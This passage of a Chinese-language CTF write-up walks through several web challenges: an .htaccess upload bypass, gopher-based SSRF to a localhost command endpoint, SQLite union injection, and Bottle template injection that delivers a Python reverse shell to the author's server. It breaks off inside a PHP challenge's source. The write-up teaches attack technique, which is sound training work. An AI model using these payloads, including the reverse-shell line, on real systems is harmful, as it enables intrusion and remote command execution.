        pickled <span class="token operator">=</span> aes_encrypt_decrypt<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'decrypt'</span><span class="token punctuation">)</span>
        <span class="token comment"># print(pickled)</span>
        pickled_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickled<span class="token punctuation">)</span>
        <span class="token comment"># print(pickled_data)</span>
        session_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickled_data<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>session_data<span class="token punctuation">)</span>

        <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">return</span> session_data <span class="token keyword">if</span> session_data<span class="token punctuation">[</span><span class="token string">"expires"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

exp <span class="token operator">=</span> Exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
create_session<span class="token punctuation">(</span>exp<span class="token punctuation">)</span>

</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/0d7f6dea98ff4647ac522e2f2fe41a97.png"/>
    </p>
    <h3>
     <a id="UPUPUP_857">
     </a>
     UPUPUP
    </h3>
    <p>
     可以上传
     <code>
      .htaccess
     </code>
     文件
     <br/>
     但是后端检验了
     <code>
      mine
     </code>
     类型, 直接加上
     <code>
      GIF89a
     </code>
     上传会报500错误,有语法错误, 而在.htaccess 中有两个注释符，或者相当于单行注释的符号 , 可以通过这两个绕过getimagesize和exif_imagetype
    </p>
    <pre><code>\x00
#
</code></pre>
    <p>
     所以就可以这样写
     <code>
      .htaccess
     </code>
    </p>
    <pre><code>#define width 1
#define height 1
&lt;FilesMatch "1.jpg"&gt;  
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
    <p>
     在上传1.jpg就行
    </p>
    <h3>
     <a id="Goph3rrr_877">
     </a>
     Goph3rrr
    </h3>
    <p>
     /app.py可以看到源码
     <br/>
     关键代码
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template_string
<span class="token keyword">import</span> os
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span> urlunparse
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> random

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
BlackList <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"127.0.0.1"</span>
<span class="token punctuation">]</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Gopher'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No url provided :)"</span>
    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    realIpAddress <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">"file"</span> <span class="token keyword">or</span> realIpAddress <span class="token keyword">in</span> BlackList<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No (≧∇≦)"</span>
    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> urlunparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Manage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Forbidden!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Allowed!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
    <p>
     本来是想在自己vps上起一个302.php跳转,
     <code>
      Gopher?url=http://pmjphw.top/302.php
     </code>
     <br/>
     但是
     <code>
      /Manage
     </code>
     路由必须要是POST方法才能执行cmd, 302跳转不起作用
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/be8ba0adf7824d31a1ce28e3290e5266.png"/>
    </p>
    <p>
     所以必须用gopher协议, 发送一个post的请求
     <br/>
     因为过滤了
     <code>
      127.0.0.1
     </code>
     , 可以使用
     <code>
      0.0.0.0
     </code>
     进行绕过
    </p>
    <p>
     payload:
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
payload <span class="token operator">=</span>\
<span class="token triple-quoted-string string">"""POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

cmd=env
"""</span>

<span class="token comment">#注意后面一定要有回车，回车结尾表示http请求结束</span>
tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">'gopher://0.0.0.0:8000/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>new
result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>       <span class="token comment"># 这里因为是GET请求所以要进行两次url编码</span>

<span class="token comment">#gopher%3A//0.0.0.0%3A8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A</span>
</code></pre>
    <h3>
     <a id="SQL_953">
     </a>
     SQL???
    </h3>
    <p>
     进入首页就是这样的, 很明显, 应该就是sql注入了
     <img alt="" src="https://i-blog.csdnimg.cn/direct/6eb08a94586c44e88025065e9022a26c.png"/>
    </p>
    <p>
     经过测试, 输入单引号和双引号
     <code>
      ' "
     </code>
     会显示hacker, 被过滤了
     <br/>
     <code>
      union select
     </code>
     联合查询一下可以发现有回显点
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/0c7057af506341868ca9d966b90af9c7.png"/>
    </p>
    <p>
     但好像没有用, 没办法执行一些操作
     <br/>
     前面一直卡在这, 没办法执行一些函数操作啥的, 就没管了, 后面wp出来之后才知道这是Sqlite注⼊ , 怪我见识短浅了
    </p>
    <p>
     比如查看版本用的是
     <code>
      sqlite_version()
     </code>
     而之前我一直用的
     <code>
      version()
     </code>
     ,总是报错
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/c7bc29bd3603411ca9c48ce5b9767401.png"/>
     <br/>
     <code>
      sqlite
     </code>
     里面没有像其他数据库那样的
     <code>
      information_schema
     </code>
     ，而是依赖
     <code>
      sqlite_master
     </code>
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/0ab4e182b42f44cfbb46e5674decc138.png"/>
    </p>
    <pre><code>id=1 union select 1,sqlite_version(),(select sql from sqlite_master limit 0,1),4,5
</code></pre>
    <p>
     查询第一条记录的创建语句 , 可以看到存在表
     <code>
      flag
     </code>
     以及字段名
     <code>
      flag
     </code>
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/9a5874a288294d44947cbc8d6dbcae24.png"/>
     <br/>
     拿数据内容
    </p>
    <pre><code>id=1 union select 1,sqlite_version(),(select * from flag),4,5
或者
id=1 union select 1,sqlite_version(),(select group_concat(flag) from flag),4,5
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/c0d7148b077747ccbc8a3cb31e38e001.png"/>
    </p>
    <h3>
     <a id="Message_in_a_Bottle_989">
     </a>
     Message in a Bottle
    </h3>
    <p>
     一个留言板, 下意识的会以为是xss, 虽然确实可以弹窗, 但是没有什么作用
    </p>
    <pre><code class="prism language-python"><span class="token keyword">from</span> bottle <span class="token keyword">import</span> Bottle<span class="token punctuation">,</span> request<span class="token punctuation">,</span> template<span class="token punctuation">,</span> run


app <span class="token operator">=</span> Bottle<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 存储留言的列表</span>
messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">handle_message</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    message_items <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"""
        &lt;div class="message-card"&gt;
            &lt;div class="message-content"&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>msg<span class="token punctuation">}</span></span><span class="token string">&lt;/div&gt;
            &lt;small class="message-time"&gt;#</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string"> - 刚刚&lt;/small&gt;
        &lt;/div&gt;
    """</span></span> <span class="token keyword">for</span> idx<span class="token punctuation">,</span> msg <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    board <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""&lt;!DOCTYPE html&gt;
    &lt;html lang="zh"&gt;
    &lt;head&gt;
        &lt;meta charset="UTF-8"&gt;
        &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
        &lt;title&gt;简约留言板&lt;/title&gt;
        &lt;link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet"&gt;
         &lt;style&gt;
            :root {<!-- -->{
                --primary-color: #4a90e2;
                --hover-color: #357abd;
                --background-color: #f8f9fa;
                --card-background: #ffffff;
                --shadow-color: rgba(0, 0, 0, 0.1);
            }}

            body {<!-- -->{
                background: var(--background-color);
                min-height: 100vh;
                padding: 2rem 0;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }}

            .container {<!-- -->{
                max-width: 800px;
                background: var(--card-background);
                border-radius: 15px;
                box-shadow: 0 4px 6px var(--shadow-color);
                padding: 2rem;
                margin-top: 2rem;
                animation: fadeIn 0.5s ease-in-out;
            }}

            @keyframes fadeIn {<!-- -->{
                from {<!-- -->{ opacity: 0; transform: translateY(20px); }}
                to {<!-- -->{ opacity: 1; transform: translateY(0); }}
            }}

            .message-card {<!-- -->{
                background: var(--card-background);
                border-radius: 10px;
                padding: 1.5rem;
                margin: 1rem 0;
                transition: all 0.3s ease;
                border-left: 4px solid var(--primary-color);
                box-shadow: 0 2px 4px var(--shadow-color);
            }}

            .message-card:hover {<!-- -->{
                transform: translateX(10px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            .message-content {<!-- -->{
                font-size: 1.1rem;
                color: #333;
                line-height: 1.6;
                margin-bottom: 0.5rem;
            }}

            .message-time {<!-- -->{
                color: #6c757d;
                font-size: 0.9rem;
                display: block;
                margin-top: 0.5rem;
            }}

            textarea {<!-- -->{
                width: 100%;
                height: 120px;
                padding: 1rem;
                border: 2px solid #e9ecef;
                border-radius: 10px;
                resize: vertical;
                font-size: 1rem;
                transition: border-color 0.3s ease;
            }}

            textarea:focus {<!-- -->{
                border-color: var(--primary-color);
                outline: none;
                box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.1);
            }}

            .btn-custom {<!-- -->{
                background: var(--primary-color);
                color: white;
                padding: 0.8rem 2rem;
                border-radius: 10px;
                border: none;
                transition: all 0.3s ease;
                font-weight: 500;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
            }}

            .btn-custom:hover {<!-- -->{
                background: var(--hover-color);
                transform: translateY(-2px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            h1 {<!-- -->{
                color: var(--primary-color);
                text-align: center;
                margin-bottom: 2rem;
                font-weight: 600;
                font-size: 2.5rem;
                text-shadow: 2px 2px 4px var(--shadow-color);
            }}

            .btn-danger {<!-- -->{
                transition: all 0.3s ease;
                padding: 0.6rem 1.5rem;
                border-radius: 10px;
                text-transform: uppercase;
                letter-spacing: 0.05rem;
            }}

            .btn-danger:hover {<!-- -->{
                transform: translateY(-2px);
                box-shadow: 0 4px 8px var(--shadow-color);
            }}

            .text-muted {<!-- -->{
                font-style: italic;
                color: #6c757d !important;
            }}

            @media (max-width: 576px) {<!-- -->{
                h1 {<!-- -->{
                    font-size: 2rem;
                }}
                .container {<!-- -->{
                    padding: 1.5rem;
                }}
                .message-card {<!-- -->{
                    padding: 1rem;
                }}
            }}
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;div class="container"&gt;
            &lt;div class="d-flex justify-content-between align-items-center mb-4"&gt;
                &lt;h1 class="mb-0"&gt;📝 简约留言板&lt;/h1&gt;
                &lt;a 
                    href="/Clean" 
                    class="btn btn-danger"
                    onclick="return confirm('确定要清空所有留言吗？此操作不可恢复！')"
                &gt;
                    🗑️ 一键清理
                &lt;/a&gt;
            &lt;/div&gt;

            &lt;form action="/submit" method="post"&gt;
                &lt;textarea 
                    name="message" 
                    placeholder="输入payload暴打出题人"
                    required
                &gt;&lt;/textarea&gt;
                &lt;div class="d-grid gap-2"&gt;
                    &lt;button type="submit" class="btn-custom"&gt;发布留言&lt;/button&gt;
                &lt;/div&gt;
            &lt;/form&gt;

            &lt;div class="message-list mt-4"&gt;
                &lt;div class="d-flex justify-content-between align-items-center mb-3"&gt;
                    &lt;h4 class="mb-0"&gt;最新留言（</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">条）&lt;/h4&gt;
                    </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token string-interpolation"><span class="token string">f'&lt;small class="text-muted"&gt;点击右侧清理按钮可清空列表&lt;/small&gt;'</span></span> <span class="token keyword">if</span> message <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">}</span></span><span class="token string">
                &lt;/div&gt;
                </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>message_items<span class="token punctuation">}</span></span><span class="token string">
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/body&gt;
    &lt;/html&gt;"""</span></span>
    <span class="token keyword">return</span> board



<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> message<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> template<span class="token punctuation">(</span>handle_message<span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Clean'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> messages
    messages <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token string">'&lt;script&gt;window.location.href="/"&lt;/script&gt;'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/submit'</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    message <span class="token operator">=</span> waf<span class="token punctuation">(</span>request<span class="token punctuation">.</span>forms<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    messages<span class="token punctuation">.</span>append<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
    <span class="token keyword">return</span> template<span class="token punctuation">(</span>handle_message<span class="token punctuation">(</span>messages<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    run<span class="token punctuation">(</span>app<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     看到代码, 会将
     <code>
      {
      <!-- -->
     </code>
     和
     <code>
      }
     </code>
     替换为空, 使用了bottle库, 查找一些资料, 发现存在ssti模板注入, 本地搭建环境, 把waf去掉, 可以发现使用
     <code>
      {
      <!-- -->
      {2*2}}
     </code>
     会回显4, 确实存在漏洞
     <br/>
     不过{ 和 } 被替换为空了那么就几乎不可能使用这种方法了
    </p>
    <p>
     进过查找一些资料, 可以发现可以通过
     <code>
      %
     </code>
     来执行python代码
     <br/>
     本地测试了一下
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/ac5a10f7231743d79572b2179475526f.png"/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/257f90ebb5e04d059df25d3cded33b36.png"/>
     可以执行代码, 但是题目是没有回显的, 所以需要反弹shell, 连上自己的vps
    </p>
    <pre><code>message=%0A%import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);#
</code></pre>
    <p>
     虽然这里显示请求失败, 但服务器还是连上了
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/230db138c79f499295d09fbff1bcd987.png"/>
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/e1101a64d9984e8b974841352808fc9e.png"/>
    </p>
    <h3>
     <a id="GetShell_1238">
     </a>
     GetShell
    </h3>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ConfigLoader</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$config</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'debug'</span> <span class="token operator">=&gt;</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'mode'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'production'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'log_level'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'max_input_length'</span> <span class="token operator">=&gt;</span> <span class="token number">100</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'min_password_length'</span> <span class="token operator">=&gt;</span> <span class="token number">8</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'allowed_actions'</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'run'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'debug'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'generate'</span><span class="token punctuation">]</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$logLevel</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$logLevel</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logLevel</span> <span class="token operator">=</span> <span class="token variable">$logLevel</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">log</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token variable">$level</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logLevel</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[LOG] <span class="token interpolation"><span class="token variable">$message</span></span>\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">UserManager</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$users</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$logger</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">addUser</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Username must be at least 5 characters"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Password must be at least 8 characters"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">users</span><span class="token punctuation">[</span><span class="token variable">$username</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">password_hash</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token constant">PASSWORD_BCRYPT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span><span class="token operator">-&gt;</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"User <span class="token interpolation"><span class="token variable">$username</span></span> added"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"User <span class="token interpolation"><span class="token variable">$username</span></span> added"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">authenticate</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">users</span><span class="token punctuation">[</span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">password_verify</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">users</span><span class="token punctuation">[</span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">logger</span><span class="token operator">-&gt;</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"User <span class="token interpolation"><span class="token variable">$username</span></span> authenticated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"User <span class="token interpolation"><span class="token variable">$username</span></span> authenticated"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Authentication failed"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">StringUtils</span> <span class="token punctuation">{<!-- --></span>
